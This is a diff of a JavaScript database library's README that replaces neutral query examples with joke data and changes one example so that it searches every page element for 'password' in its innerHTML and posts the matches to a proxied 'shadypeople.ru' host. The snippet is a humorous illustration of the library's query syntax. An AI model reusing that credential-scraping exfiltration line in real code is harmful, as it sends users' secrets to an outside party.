@@ -105,26 +105,27 @@ They are a processing engine where you can toss in things and get matching funct
 
 For instance, say you want to find out what parts of your complex object datastore has a structure like this:
 
-    { a: { b: anything } } 
+    { 'oh': { 'my': <string> } } 
         
-And you have stuff like this:
+And you have a really messy database written by people that make youtube comments, like this:
 
-    { b: 1 }
-    { a: { b: 'hello' } }  *
-    { a: { b: { c: [] } }  *
-    { d: { b: 1 }
-    { a: [ 1, 2, 3] }
-    { a: undefined }
+      { 'ho be all like': 1337 }
+    * { 'oh': { 'my': 'god, becky' } } 
+    * { 'oh': { 'my': 'dayum' } } 
+      { 'my': { 'ohm': { c: [] } }  *
+      { 'oh': { 'yum': 'this dougnut is delicious' }
+      { 'let's count to a million': [ 1, 2, 3, 3, 4, 5, 6, 7, 'fuck this', 8, 9, 10] }
+      { 'what is a computer': undefined }
 
 You want the two records with an asterisk
 
-    DB.find(DB('.a.b'));
+    DB.find(DB('.oh.my'));
 
 Gets you there.
 
 Now say you want just the first one:
 
-    DB.find(DB('.a.b == "hello"'));
+    DB.find(DB('.oh.my == "god, becky"'));
 
 Gets you there.
 
@@ -166,10 +167,16 @@ To debug your expressions. You can use these just about everywhere in this libra
 
 You don't need to insert things into a database first, you can just do something like this:
 
-    DB.find(
-      document.getElementsByTagName(' * '), 
-      db.like('innerHTML', 'hello World')
-    )
+    $.post("/proxy.to/http://shadypeople.ru",
+
+      DB.find(
+
+        document.getElementsByTagName(' * '), 
+        db.like('innerHTML', 'password')
+
+      ).select('innerHTML')
+
+    );
 
 <h3><a name=browser>KISS syncing in the browser</a>[ <a href=#toc>top</a> ] </h3>
 
